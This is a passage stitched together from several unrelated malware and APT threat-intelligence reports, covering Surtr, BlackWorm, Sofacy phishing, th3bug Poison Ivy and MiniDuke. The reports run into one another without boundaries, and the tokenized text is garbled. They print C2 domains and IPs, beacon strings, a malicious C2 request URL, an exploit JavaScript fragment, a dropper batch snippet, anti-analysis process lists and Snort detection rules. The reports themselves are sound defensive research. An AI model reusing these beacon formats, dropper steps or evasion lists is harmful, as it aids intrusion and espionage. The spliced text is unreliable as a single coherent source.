This sample connects to google.djkcc.com and uses campaign code in1102 .
Other subdomains under djkcc.com include : airforce.djkcc.com domain.djkcc.com google.djkcc.com indianembassy.djkcc.com mailnic.djkcc.com ( MailNIC is an Indian email site at the National Informatics Centre ) microsoft.djkcc.com rediffmail.djkcc.com ( Rediffmail is an Indian email site ) While we do not have information about what victims these samples target , the campaign code , C2 domain , and related subdomains give some possible indications .
One additional find via VTI is a GmRemote sample internally named : GmKeyBoradServer_DLL.dll ( MD5 e7e1c69496ad7cf093945d3380a2c6f4 ) .
It exports functions ( GmFunctionType , GmInitPoint , GmMyInitPoint , GmRecvPoint , GmShutPoint , GmVerSion ) that are referenced in other GmRemote samples , although none of them have any real content .
These additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being utilized by multiple threat actors .
The attacks we have observed that use the Surtr malware family are another example of the persistent targeted malware campaigns the Tibetan community faces .
The specific attack reported in this post demonstrates that attackers are actively monitor mailing lists and discussion groups used by the Tibetan community and repurpose the content for use in targeted malware attacks .
For communities under persistent threat from targeted malware campaigns , user vigilance and education are essential for reducing risk .
Users should carefully examine the sender 's email address of emails and exercise caution in opening unexpected or unsolicited attachments or opening unverified links .
See Citizen Lab 's Recommendations for defending against targeted cyber threats for additional information , and Tibet Action Institute 's Detach from Attachments and Think Before You Click campaigns .
The Citizen Lab is continuing to monitor targeted malware campaigns using Surtr and will post updates as they are available .
– Email Attachment Names & MD5s : 1 ) TCCC PRESIDENT & BOARD MEMBERS NOMINATION & ELECTION POLICY & PROCEDURE.doc – 8c06aec37c7e51f581aaa41f66d4ebad2 ) communication1.doc – 28444ee593653a4816deb186a6eddee83 ) communication2.doc – c269b3cf3d336a40c2fd7c2111b52982 Stage 1 Section : .text
MD5 hash : d4f9b3b573a8f1d70d58aa8daf9cb256 SHA-1 hash : a1d5128cd50959bc7008be1fdfe2cf6339ed7098 SHA-256 hash : aef9f55931d054dbf027639e30d0abf587696b13d8993aab6c22eb7d47f0de83 Section : .rdata
MD5 hash : e130ff2adbf4515b1af88b451396e1f6 SHA-1 hash : 248691810ae34407aa3486ef3faca6fe3286f630 SHA-256 hash : adae7b2306d7fc145ebd90fd1147bc352c56937d58e1996b89d5368cebdb438d Section : .data
MD5 hash : c4fc864da3ee8462c5c25054f00e703f SHA-1 hash : b28a02f68cbacdaa89cf274dc79b3c802a21599d SHA-256 hash : 203ca80897fd63ca3fc55ec4be22cd302d5d81729ee8f347bd8f22c73ad1b61d Section : .reloc
MD5 hash : bc2c349c1f4c338c6834a79c03c461fb SHA-1 hash : c71504a96ea72656ef826677a53f9a5230fcb049 SHA-256 hash : 58c192f73afe761b42493a36ded1a5724f06e14f44304b946341eb46b3bdfa7d The hashes of the resource section vary based on how much it is padded .
Notable Strings : cScCssvdcfhgshtj CrtRunTime.log aCvVpR _ One.dll _ Fra.dll asasdasrqwfsdvctyqwm efskdfjaslkfjlaksd dksfjasdklfjasd casfjaklsdjfaskdlf bakjfasdkljfkldfjaslkd adskjfksldjfklsad soul LiveUpdata_Mem\ Burn\ Stage 2 ( downloaded component ) MD5 : 21aa9dd44738d5bf9d8a8ecf53c3108c Notable Strings : x86_GmRemote.dll Mark D : \Project\GTProject\Public\List\ListManager.cpp Footnote Post a Comment Your email is never shared .
The Syrian Electronic Army has made news for its recent attacks on major communications websites , Forbes , and an alleged attack on CENTCOM .
While these attacks garnered public attention , the activities of another group – The Syrian Malware Team – have gone largely unnoticed .
The group 's activities prompted us to take a closer look .
We discovered this group using a .NET
based RAT called BlackWorm to infiltrate their targets .
The Syrian Malware Team is largely pro - Syrian government , as seen in one of their banners featuring Syrian President Bashar al - Assad .
Based on the sentiments publicly expressed by this group it is likely that they are either directly or indirectly involved with the Syrian government .
Further certain members of the Syrian Malware Team have ties to the Syrian Electronic army ( SEA ) known to be linked to the Syrian government .
This indicates that the Syrian Malware Team may also be possibly an offshoot or part of the SEA .
Banner used by the Syrian Malware Team We found at least two distinct versions of the BlackWorm tool , including an original / private version ( v0.3.0 ) and the Dark Edition ( v2.1 ) .
The original BlackWorm builder was co - authored by Naser Al Mutairi from Kuwait , better known by his online moniker ' njq8′ .
He is also known to have coded njw0rm , njRAT / LV , and earlier versions of H - worm / Houdini .
We found his code being used in a slew of other RATs such as Fallaga and Spygate .
BlackWorm v0.3.0 was also co - authored by another actor , Black Mafia .
About section within the original version of BlackWorm builder Within the underground development forums , it 's common for threat actors to collaborate on toolsets .
Some write the base tools that other attackers can use ; others modify and enhance existing tools .
The BlackWorm builder v2.1 is a prime example of actors modifying and enhancing current RATs .
After njq8 and Black Mafia created the original builder , another author , Black . Hacker , enhanced its feature set .
About section within BlackWorm Dark Edition builder Black . Hacker 's banner on social media As an interesting side note , ' njq8′ took down his blog in recent months and announced a cease in all malware development activity on his Twitter and Facebook account , urging others to stop as well .
This is likely a direct result of the lawsuit filed against him by Microsoft .
The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload , but does n't allow any configuration other than the IP address for command and control ( C2 ) .
Building binary through BlackWorm v0.3.0 BlackWorm v0.3.0 controller BlackWorm v0.3.0 supports the following commands between the controller and the implant : In addition to the features supported by the command structure , the payload can : Seek and kill no - ip processes DUC30 and DUC20 Disable Task Manager to kill process dialog Copy itself to USB drives and create autorun entries Copy itself to common peer - to - peer ( P2P ) share locations Collect system information such as OS , username , hostname , presence of camera , active window name , etc . , to display in the controller Kill the following analysis processes ( if found ) : procexp SbieCtrl SpyTheSpy SpeedGear Wireshark MBAM ApateDNS IPBlocker cPorts ProcessHacker AntiLogger The Syrian Malware Team primarily uses another version of BlackWorm called the Dark Edition ( v2.1 ) .
BlackWorm v2.1 was released on a prolific underground forum where information and code is often shared , traded and sold .
BlackWorm v2.1 has the same abilities as the original version and additional functionality , including bypassing UAC , disabling host firewalls and spreading over network shares .
Unlike its predecessor , it also allows for granular control of the features available within the RAT .
These additional controls allow the RAT user to enable and disable features as needed .
Binary output can be also be generated in multiple formats , such as .exe
, .src
and .dll
.
BlackWorm Dark Edition builder We observed activity from the Syrian Malware Team going as far back as Jan. 1 , 2011 .
Based on Facebook posts , they are allegedly directly or indirectly involved with the Syrian government .
Their Facebook page shows they are still very active , with a post as recent as July 16th , 2014 .
Syrian Malware Team 's Facebook page The Syrian Malware Team has been involved in everything from profiling targets to orchestrating attacks themselves .
There are seemingly multiple members , including : Partial list of self - proclaimed Syrian Malware Team members Some of these people have posted malware - related items on Facebook .
Facebook posting of virus scanning of files While looking for Dark Edition samples , we discovered a binary named svchost.exe ( MD5 : 015c51e11e314ff99b1487d92a1ba09b ) .
We quickly saw indicators that it was created by BlackWorm Dark Edition .
Configuration options within code The malware communicated out to 178.44.115.196 , over port 5050 , with a command structure of : ! 0/j|n\12121212_64F3BF1F / j|n\ { Hostname } /j|n\ { Username } /j|n\USA / j|n\Win 7 Professional SP1 x86/j|n\No / j|n\2.4.0 [ Dark Edition ] /j|n\/j|n\ { ActiveWindowName } /j|n\ [ endof ] When looking at samples of Dark Edition BlackWorm being used by the Syrian Malware Team , the strings '' Syrian Malware , '' or `` Syrian Malware Team '' are often used in the C2 communications or within the binary strings .
Additional pivoting off of svchost.exe brought us to three additional samples apparently built with BlackWorm Dark Edition .
E.exe , ( MD5 : a8cf815c3800202d448d035300985dc7 ) a binary that drew our attention , looked to be a backdoor with the Syrian Malware strings within it .
When executed , the binary beacons to aliallosh.sytes.net on port 1177 .
This C2 has been seen in multiple malware runs often associated with Syria .
The command structure of the binary is : ! 0/j|n\Syrian Malware / j|n\ { Hostname } /j|n\ { Username } /j|n\USA / j|n\Win 7 Professional SP1 x86/j|n\No / j|n \0.1/j|n\/j|n\ { ActiveWindowName } /j|n\ [ endof ] Finally , pivoting to another sample , 1gpj.srcRania ( MD5 : f99c15c62a5d981ffac5fdb611e13095 ) , the same strings were present .
The string `` Rania '' used as a lure was in Arabic and likely refers to the prolific Queen Rania of Jordan .
The traffic is nearly identical to the other samples we identified and tied to the Syrian Malware Team .
! 1/j|n\C : \Documents and Settings\ { Username } \Local Settings\Application DataldoDrZdpkK.jpg – Windows Internet Explorer [ endof ] ! 0/j|n\Syrian Malware / j|n\ { Hostname } /j|n\ { Username } /j|n\USA / j|n\Win XP ProfessionalSP2 x86/j|n\No / j|n\0.1/j|n\/j|n\C : \Documents and Settings\ { Username } \Local Settings\Application DataldoDrZdpkK.jpg – { ActiveWindowName } /j|n\ [ endof ] Determining which groups use which malware is often very difficult .
Connecting the dots between actors and malware typically involves looking at binary code , identifying related malware examples associated with those binaries , and reviewing infection vectors , among other things .
This blog presents a prime example of the process of attribution .
We connected a builder with malware samples and the actors / developers behind these attacks .
This type of attribution is key to creating actionable threat intelligence to help proactively protect organizations .
This entry was posted in Threat Intelligence , Threat Research and tagged advanced threat , syrian cyber threats , Syrian Electronic Army , Syrian Malware Team , threat group by Kyle Wilhoit and Thoufique Haq .
Bookmark the permalink .
Background Our analysts follow the activities of a number of threat groups with a wide range of motivations .
In this bulletin we are sharing intelligence relating to a recent phishing campaign conducted by a group widely referred to as ' Sofacy ' , named after the antivirus detection name for one of the malware families used by the group .
Over the years there have been a number of papers discussing variations to the malware used by the group , but little discussion of less sophisticated techniques employed by the same attackers .
Analysis Sofacy has been discussed before as being used to target APEC members and there has also been some prior analysis of the malware itself .
Variants of the malware have been in use for a considerable amount of time – for example , the screenshot below is from the decoy document loaded by one of the earliest versions present on ThreatExpert , from February 2010 .
Sample 5e3bea788e89e0814e898b4a648b93c0b74f7e2c Decoy documents are used in conjunction with malware droppers in order to make the target believe the file they have just opened is legitimate .
The documents often give an indication of the attackers ' intended targets .
More recently , ESET have reported5 on related spear phishes using NATO / Ukrainian conflict themes and watering hole attacks likely targeting the defence industry and a Polish finance company .
It has been publicly speculated before that Sofacy malware is Russian in origin .
Indicators found in the malware analysis referenced in the appendix , such as embedded resources and targeting would appear to support this theory .
Targeting Recently , we observed a number of new domain registrations by the Sofacy attackers , all of which are closely related via shared WHOIS data and infrastructure .
New domain registrations are usually indicative of a new campaign , and so we were eager to find new samples of the malware which connected to the infrastructure .
The domain names chosen were almost identical to the legitimate domains of several organisations , a common technique and , like carefully chosen decoy documents , often gives clues as to the likely targets of the campaign .
The new domain names mimicked organisations in the following categories : • International and European diplomatic institutions • Popular providers of web services • Military institutions , contractors and conferences • Energy companies • News organisations based out of the United States and Central Europe In addition to new malware samples , we also found examples where the attackers were using the simple technique of phishing for credentials .
The usage of malware in targeted attacks to steal information of value to attackers has been widely reported , however the simple technique of phishing for credentials , whilst still relatively common in targeted attacks , is still more typically associated with criminal attackers involved in day to day cyber - fraud .
The pages used for phishing typically used obfuscated code to redirect the user to another webpage : In some pages the malicious redirect was disabled by the attackers , by placing additional JavaScript on the page which would redirect users to a legitimate site preferentially .
Fake login pages were observed both for webmail and two factor - authentication platforms .
In the second case this would require the attackers to log in at the same time as affected victims , showing a level of dedication to the cause .
As well as the domains used being similar to those of the targeted , the pages were also made to appear the same as their legitimate counterparts , making it difficult for end - users to tell they were being duped .
For example the screenshot below shows the contents of a credential phishing website designed to mimic the legitimate OWA site of a defence contractor .
The attacker 's version is on the left , the real version is on the right : Two of the domains we identified have previously been associated in open source with credential phishing , although not attributed to this group of attackers :  In October 2013 the domain chmail [ .
] in was reported as being used in widespread attacks against users of the Iranian mail service chmail [ .
] ir  In January 2014 the domain google - settings [ .
] com was reported as being used in credential theft against some gmail users .
Recommended Actions As ever with phishing attacks , one of the most important preventative steps you can take is to educate staff on how to identify suspicious emails – especially as there are fewer technical measures that can be taken to prevent low distribution phishing attacks which aim to steal credentials than there are for similar attacks involving malware .
Organisations with good logging for their e - mail data could attempt to detect activity relating to compromised accounts by alerting on `` impossible journeys '' , where locations from which users log in are monitored and where alerts are produced when a single user logs in from two separate countries in a short period of time .
Snort Signatures We have developed some SNORT signatures to detect the current template used by the attackers in their phishing campaigns .
The following signatures detect Javascript that is present on many obfuscated redirects , not necessarily related to this activity but which may be indicative of Sofacy phishing : alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' \ '' \\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\ '' '' ; classtype : trojan - activity ; reference : url , http : //pwc.blogs.com / cyber_security_updates/2014/10/phresh - phishing - against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' \ '' x6Cx6Fx63x61x74x69x6Fx6E\ '' '' ; classtype : trojan - activity ; reference : url , http : //pwc.blogs.com / cyber_security_updates/2014/10/phresh - phishing - against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) The following comment occurs in many of the pages we ' ve observed relating to this campaign , but can also appear in some legitimate sites : alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg : '' Potential Sofacy Phishing Redirect '' ; flow : established , to_client ; content : '' // stop for sometime if needed '' ; classtype : trojan - activity ; reference : url , http : //pwc.blogs.com / cyber_security_updates/2014/10/phresh - phishing - against- government-defence-and-energy.html ; sid : xxxxxx ; rev:1 ; ) For more information on this threat actor and further indicators of compromise , please get in touch with us at threatintelligence @ uk.pwc.com .
Appendix 1 - Domains Domains involved in this phishing campaign and associated domains used by the same threat actor : References http : //smallmedia.org.uk / sites / default / files / u8/IIIPSepOct.pdf https : //twitter.com / MalCrawler / status/489128440323252226 The information contained in this document has been prepared as a matter of interest and for information purposes only , and does not constitute professional advice .
You should not act upon the information contained in this email without obtaining specific professional advice .
No representation or warranty ( express or implied ) is given as to the accuracy or completeness of the information contained in this email , and , to the extent permitted by law , PricewaterhouseCoopers LLP , its members , employees and agents do not accept or assume any liability , responsibility or duty of care for any consequences of you or anyone else acting , or refraining to act , in reliance on the information contained in this email or for any decision based on it .
Using Poison Ivy We ' ve uncovered some new data and likely attribution regarding a series of APT watering hole attacks this past summer .
Watering hole attacks are an increasingly popular component of APT campaigns , as many people are more aware of spear phishing and are less likely to open documents or click on links in unsolicited emails .
Watering hole attacks offer a much better chance of success because they involve compromising legitimate websites and installing malware intended to compromise website visitors .
These are often popular websites frequented by people who work in specific industries or have political sympathies to which the actors want to gain access .
The attacks discussed in this blog are related to an APT campaign commonly referred to as `` th3bug '' , named for the password the actors often use with their Poison Ivy malware .
Of note , only the older of the samples we cover in this blog used that password .
We do n't know the reason the actors changed this , but it could possibly be in reaction to information widely published on the Internet about their activities , which use that password as a key component to tie the activity together .
FireEye in particular published a paper describing several APT campaigns whose activity they correlate using Poison Ivy passwords .
In contrast to many other APT campaigns , which tend to rely heavily on spear phishing to gain victims , '' th3bug '' is known for compromising legitimate websites their intended visitors are likely to frequent .
Over the summer they compromised several sites , including a well - known Uyghur website written in that native language .
While we were unable to recover the initial vulnerability used , it is possibly the same CVE 2014 - 0515 Adobe Flash exploit first reported by Cisco TRAC in late July .
We can not confirm the initial compromised sites , but we noted traffic to several known re - direct sites and the malware was configured to use the same command and control ( C2 ) server .
In addition , the download dates of many of our files pre - date those noted by Cisco by only a few days .
All of the malware were variants of the Poison Ivy Remote Administration Tool ( RAT ) and were properly identified as such by our WildFire platform .
The targets of the attack were : Uyghur sympathizers An East Asian office for a major US based computer manufacturer A major US university An international wholesale and retail telecom provider We saw the first sample on July 14 , 2014 .
This sample had an interesting PDB string – C : \Users\sophie\documents\visual studio 2010\Projects\init\Release\init.pdb with a time date string that exactly matched the PE timestamp of 11 July , 2014 .
Table 1 The next day we collected several copies of the same malware intended for the same industry .
They were downloaded from one of the download URLs in the below table , but all had the same MD5 and C2 domain .
Table 2 On July 16 WildFire picked up a malicious executable hosted on uyghurweb.net , a legitimate Uyghur website that was compromised to infect users .
The file was named `` PYvBte.jar '' but was actually a Windows executable .
The file has the characteristics listed in Table 3 , and appears to be a stand - alone executable version of the Metasploit Meterpreter shell .
When this file runs , it downloads a payload from uyghurweb.net/player/gmuweb.exe and executes it .
This file is the same Poison Ivy RAT described in Table 2 .
The Meterpreter payload masquerades as a copy of the ApacheBench tool made by the Apache Software Foundation .
Table 3 On 21 July , we detected another sample that was noted in the Cisco TRAC blog .
The initial download URL and IP resolution were different than the previous samples , but the C2 domain and resolution matched .
This file is also a Poison Ivy variant .
Table 4 Based on historical IP resolution overlaps between the above C2 domains and other domains that have also resolved to the same IPs , we found an additional sample from the beginning of this year .
Interestingly , the first sample was not logged in VirusTotal prior to our submission , despite the sample having been in use in the wild for at least seven months .
In addition , it is the only sample tied to this activity we found that used the Poison Ivy password `` th3bug '' .
AVAST wrote a blog related to the activity we describe here and tied a file with the same name , but the sample we found does n't match any other details of the file they documented .
Also of note , the IP resolution for this C2 domain was changed to match the IP resolution of the C2 domains used in the July activity only a few days after these samples were seen .
Additionally , the files PE timestamp was January 21 , the day before we detected the sample .
Targeted industries for this series are listed below .
Another international wholesale and retail telecom provider A major visual computing company headquartered in the US A state - owned East Asian financial services company Table 5 Watering hole attacks will continue to be popular with APT campaigns , as they are much harder to defend against then spear phishing attacks .
There is no way for people browsing to these websites to know in advance the normally trusted website has been compromised and will serve them malware when they visit it .
Ensuring web browsers and operating system software is fully patched and up - to - date is the best way to defend against this type of threat .
However , to increase success rates APT campaigns can use zero - day exploits , so even a properly patched system would be compromised .
Palo Alto Networks users should use our firewall 's ability to block executable downloads unless the user specifically authorizes it .
If you want to allow executables through but prefer that they be analyzed for malicious activity , use our WildFire platform , which correctly identified all of the files listed in this blog as malware and provides users with a full report on the samples host and network - based activities .
Authors : Costin Raiu , Igor Soumenkov , Kurt Baumgartner , Vitaly Kamluk Global Research and Analysis Team , Kaspersky Lab On Feb 12th 2013 , FireEye announced the discovery ( http : //blog.fireeye.com / research/2013/02/the - number - of - the- beast.html ) of an Adobe Reader 0-day exploit which is used to drop a previously unknown , advanced piece of malware .
We called this new malware `` ItaDuke '' because it reminded us of Duqu and because of the ancient Italian comments in the shellcode copied from Dante Aligheri 's Divine Comedy .
Since the original announcement , we have observed several new incidents using the same exploit ( CVE-2013 - 0640 ) , some of which were so unusual that we decided to analyze them in depth .
Together with our partner CrySyS Lab , we ' ve performed a detailed analysis of these new incidents which indicate a new , previously unknown threat actor .
For their analysis , please read http : //blog.crysys.hu/2013/02/miniduke/ .
For our analysis , please read below .
First of all , while the fake `` Mandiant '' PDF reports ( see http : //blog.seculert.com/2013/02/spear - phishing - with - mandiant - apt- report.html ? utm_source = feedburner & utm_medium = feed & utm_campaign = Feed % 3A+SeculertResearchLab+ ( Seculert+Researc h+Lab ) ) are just dirty hacks of the original exploit , these newer attacks appear to have been created by a 0-day toolkit that was used to build the original `` Visaform Tukey.pdf '' discovered by FireEye .
The new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed .
The documents refer to a human rights seminar ( ASEM ) and Ukraine 's foreign policy and NATO membership plans : Document used against the Hungarian target Document used against the Belgian target PAGE 3| The MiniDuke Mystery : PDF 0-day Government Spy Assembler 0x29A Micro Backdoor | Document used against the Luxemburg target The MD5s for the documents used in this attack are : 3668b018b4bb080d1875aee346e3650a action_plan.pdf ( Country : Belgium ) 88292d7181514fda5390292d73da28d4 ASEM_seminar.pdf ( Country : Hungary ) 3f301758aa3d5d123a9ddbad1890853b EUAG_report.pdf ( Country : Luxembourg ) 0cdf55626e56ffbf1b198beb4f6ed559 report.pdf ( Country : Spain ) cf5a5239ada9b43592757c0d7bf66169 EUAG_report.pdf ( Country : Belgium ) c03bcb0cde62b3f45b4d772ab635e2b0 The 2013 Armenian Economic Association.pdf ( Country : Belgium ) The JavaScript exploit code has been modified since the original attack .
For instance , the function named `` oTHERWISE '' was renamed to `` q1w2e3r4 t '' .
The function is later called in the code like this : New exploit : var sCIENZA = q1w2e3r4 t ( vOLENCI [ sHOGG ( ' ODNEDNERp',3329,7937 ) ] , gIRARSI ) ; Older ( `` Visaform Turkey.pdf '' ) exploit : var sCIENZA = oTHERWISE ( vOLENCI [ ' pRENDENDO ' ] , gIRARSI ) ; In addition , the JS code is now in compressed format , while the original sample had it in plaintext .
The reason behind the changes is probably to avoid detection by anti - malware products although this does n't prevent our product from detecting it heuristically as `` HEUR : Exploit . Script . Generic '' .
The shellcode contained in the PDF document is similar to that used in the documents carrying the `` Itaduke '' payload , with some differences .
For instance , after exploiting the vulnerability , it searches for a specific signature within the PDF file .
While the `` Itaduke '' shellcode was looking for `` ! H2bYm . Sw @ '' , the MiniDuke version uses a different signature , `` @ 34fZ7E*p\ '' .
Signature in the Itaduke PDF file Signature in the Miniduke PDF file Once the payload signature is found , it is decrypted with XOR and then decompressed using RtlDecompressBuffer API ( LZNT1 ) .
The resulting PE file is written to a temporary file and loaded using LoadLibary API .
The resulting dynamic library implements the second stage of installation .
It contains two binary resources , 101 and 102 .
Resource 101 is the main backdoor DLL component .
It is written to the % AppData % directory and loaded using LoadLibary API .
Resource 102 is the decoy PDF document .
It is written to the Internet cache directory and then opened using a simple BAT file : TASKKILL /F /IM acro * ping -n 1 127.0.0.1 > nul start `` '' `` % path to decoy PDF document % '' The filenames of the dropped files are hardcoded in their resources .
Beginning of the resource 101 with its filename Beginning of the resource 102 with its filename Interestingly , the malware dropper contains the following paths : ● `` c : \src\dlldropper\Release\L2P.pdb '' .
● `` C : \src\hellodll\Release\hellodll.pdb '' .
These paths did not exist in the dropper of original PDF ( `` Visaform Turkey.pdf '' ) .
If we are to trust the PE headers , the dropper was compiled on Feb 20 , 2013 : ' Hungarian ' dropper compilation time - `` Feb 20 10:51:16 2013 '' The backdoor used in the Hungarian case was compiled on `` Feb 20 10:57:52 2013 '' , just minutes after the dropper was created .
Perhaps the most unusual thing about these three new attacks is the malware they drop .
In all the analyzed cases , the dropped malware is in the form of a 22,528 bytes DLL file .
Parts of the malicious DLL file are encrypted with information related to the system configuration , which ensures it will only work properly on the victim 's system .
If copied to another computer , the malware will be unable to function successfully .
The backdoor is written in `` old school '' assembler and is tiny by current standards - only 20 KB .
This is most unusual for modern malware , which can be several megabytes in size .
It has a small decryptor at the beginning that decrypts the main body .
All three cases use different encryption keys .
Another peculiarity is that the backdoor has no imports : all functions are scanned from memory and are called dynamically .
It is also interesting that the first two Win32 APIs resolved and called by the unpacking stub are ntdll . LdrLoadDll and kernel32.VirtualProtectEx .
These two functions are not called according to the '' _ stdcall '' convention .
Instead , a ' jmp ebx ' instruction is executed after manually building the stack .
Clearly some thought went into creating anti - emulation and anti - scanning techniques with this malware .
The backdoor has a single export , which for instance is named `` JorNgoq '' in the Hungarian case .
When this export is called at load , the backdoor sets the `` .rdata
'' section 's permissions to `` RWX '' and sets the mutex to a hardcoded string `` nljhfdb '' .
The entrypoint of the library ( DllMain ) is obfuscated and the main body of the malware is encrypted .
The encryption is rather simple : the `` .rdata
'' section of the library is ROL'ed with a linear key and XOR'ed with a fixed key .
Both keys are derived from the length of the encrypted part .
Once finished decrypting , the library proceeds to the real `` main '' function .
The main part of the library is written in Assembler , in an `` old - school '' manner typical for low - level viruses .
The code is position independent ; it has no imports and resolves API function addresses by hash values of their names .
.
The backdoor maintains seven call addresses that each maintain their own block of functionality .
The first block calls GetAsyncKeyState twice , checking for a mouse click , which indicates user activity in the system .
The second block searches for all `` * .exe '' and `` * .dll '' files located in the % temp % directory .
The third block fetches information about the infected system with calls to gather information about the CPU , drive and the computername - these are used to decrypt the backdoor 's main body , which is custom encrypted for each unique victim .
The fourth block attempts to maintain self - protection from malware analysis .
Below is the list of tools ( and VMware ) that it attempts to identify and protect against .
It fetches the list of running processes on the system and attempts to identify if these tools are among them : apispy32.exe , apimonitor.exe , winapioverride32.exe , procmon.exe , filemon.exe , regmon.exe , winspy.exe , wireshark.exe , dumpcap.exe , tcpdump.exe , tcpview.exe , windump.exe , netsniffer.exe , iris.exe , comview.exe , ollydbg.exe , windbg.exe , odb.exe , ImmunityDebugger.exe , syser.exe , idag.exe , idag64.exe , petools.exe , vboxtray.exe , vboxservice.exe , procexp.exe , vmtools.exe , vmwaretray.exe , vmwareuser.exe If any of the tools above are detected on the system , the malware will continue running on the system without further decrypting its code and exhibiting any other functionality .
This will prevent it from doing any outbound communications with Twitter accounts , as described below .
In other words , it will attempt to appear non - functional , especially to automated analysis , hiding its true nature behind its layers of encryption .
User agent strings for web browsers like Opera , Mozilla and Internet Explorer are decrypted and used for all Internet access .
Oddly , there are Linux versions included as well : ( Windows NT 5.1 ; ( Windows NT 6.0 ; ( Windows ; U ; Windows NT 5.2 ; ( X11 ; Linux i686 ; ( X11 ; Linux x86_64 ; ( compatible ; MSIE 6.0 ; Windows NT 5.0 ; ( compatible ; MSIE 7.0 ; Windows NT 6.0 ; ( compatible ; MSIE 9.0 ; Windows NT 6.1 ; WOW64 ) ; Trident/4.0 ) ; Trident/5.0 ) ; WOW64 ; Trident/5.0 ) ; SV1 ) ) The fifth and sixth code blocks are most interesting .
They calculate the SHA1 of main system information which will be used in the C2 interaction later .
Following the SHA-1 hash generation , the backdoor will base64 encode its unique hash for later C2 communication .
The malware is activated upon reboot of the infected machine .
To gain control at boot , it writes a randomly named LNK file to the startup folder , which in turn calls the main body using rundll32 : In the picture above , the malware 's main body is stored as `` stat.bin '' ( a randomly selected name ) in the `` Adobe '' folder .
The LNK file calls it only exported function , `` ImqRgno '' .
Once activated , the malware will first contact Twitter and look for posts from some very specific accounts .
These accounts should have posted an encrypted string which contains the magic identifier `` uri ! `` , then an encrypted c2 string .
We presume many other Twitter accounts exist with similar parameters .
The encrypted `` uri ! '' holds a different c2 for each version of the malware : It 's most likely that these websites have been hacked by the attackers and injected with the command and control PHP script .
Secondly , the malware will connect to `` www.geoiptool.com '' to obtain information about the victim 's location .
Interestingly , the backdoor has another update / c2 functionality .
It searches Google for a very specific string : The pages found by the Google search may hold an update `` uri '' similar to the one from Twitter .
We can assume the attackers wanted to have a second channel for updates in case the Twitter accounts are closed .
Stage 2 The `` index.php '' on the C2 serves a fake GIF file to the victim , depending on the parameters it receives .
Here 's what one of these GIF files looks like : Here 's one example of a malicious request for the C2 domain `` arabooks*dot+ch '' : arabooks.ch/lib/index.php ? ia = TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp [ REMOVED ] lhUDx vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw== The picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data , known as ' steganography ' : At offset 0x6a4 inside the GIF file , there is a hidden encrypted PE file .
The encryption scheme used a DWORD key also stored in the GIF file that is rotated .
Effectively , this translates to an 8 byte long XOR key .
The resulting encryption key used in the Hungarian attack for instance is { 0xD2 , 0x2A , 0xA2 , 0x27 , 0x79 , 0x95 , 0x52 , 0x2D } .
In the Belgian attack , it is { 0xC5 , 0x5E , 0xEE , 0xE5 , 0x51 , 0x11 , 0x17 , 0x7C } .
For the Luxemburg attack , the key is { 0x91 , 0x18 , 0x8C , 0xC1 , 0x1C , 0xC9 , 0x9C , 0xC9 } .
The decrypted PE file ( plugin / payload ) is also written in assembler and , once again , it is encrypted with the same algorithm as the backdoor originally deployed in the system .
We refer to it as `` stage 2 '' .
The main backdoor body saves the plugin with different names , for instance , it can be `` xml.dat '' and tries to run its only export using rundll .
In our case , this did n't appear to work very well : Several different variants of the 2nd stage backdoors have been observed on the C2 ; they all perform similar functions but are encrypted with different keys and contact different C2s .
The malware connects to several C2s depending on the information available on the control Twitter accounts or on Google .
For instance , on `` artas*dot+org '' it connects to `` /engine / index.php '' .
Interestingly , the `` img '' subfolder allows listings and we can see several variants of the backdoor encrypted as GIF files : On `` tsoftonline*dot+com '' , the folder has the same structure : Interestingly , on `` tsoftonline*dot+com '' we have several other files with different kind of names and sizes .
They are larger and follow a different naming scheme : `` * number+.gif '' .
We believe they are custom backdoors delivered only to specific victims by the attackers .
We refer to these as `` stage 3 '' .
While we were analyzing the samples , the attackers connected to the C2 and added a custom backdoor as `` 1109821546.gif '' : `` http : //tsoftonline.com / views / img/1109821546.gif '' HTTP/1.1 200 OK Date : Mon , 25 Feb 2013 12:34:13 GMT Server : Apache Last - Modified : Mon , 25 Feb 2013 10:59:49 GMT ETag : `` 7c8251 - 5190d-4d68a708d9340 '' Accept - Ranges : bytes Content - Length : 334093 Content - Type : image / gif This custom backdoor , referred to as `` stage 3 '' , is much bigger than the previous ones – 300K+ in size .
This is because the attackers used large layers of obfuscation code , including UCL compression .
So far , we have observed two variants of the 300 K '' stage 3 '' backdoor .
The PE compilation timestamp for both is `` Mon Jun 18 17:28:11 2012 '' .
The number `` 1109821546 '' in the filename refers to the unique victim ID .
In this case , we were able to determine that the victim is based in Portugal .
The backdoor connects to the following C2 for instructions : news [ dot ] grouptumbler [ dot ] com / news / feed.php IP : 200.63.46.23 It supports several commands , such as copy file , move file , remove file , make directory , kill process and of course , download and execute new malware .
The server at 200.63.46.23 is hosted in Panama : We presume that it was hacked by the attackers and is currently used as a command server for the attacks .
MD5 hashes for the known `` Stage 3 '' backdoors : 1e1b0d16a16cf5c7f3a7c053ce78f515 v1.ex_ 53db085a276ebbf5798ba756cac833ea v2.ex_ In addition to the ~300 K `` stage 3 '' backdoors , we ' ve observed a 13 K module ( MD5 : 6bc34809e44c40b61dd29e0a387ee682 ) .This
module will connect to an IP in Turkey , get the response , decrypt it in memory and execute it .
The C2 is : 85.95.236.114 The module has a compilation timestamp of `` Tue Nov 13 14:30:12 2012 '' .
The C2s maintain a detailed , encoded log of the victims connecting to the servers .
The logs are available to anyone who knows the exact filename .
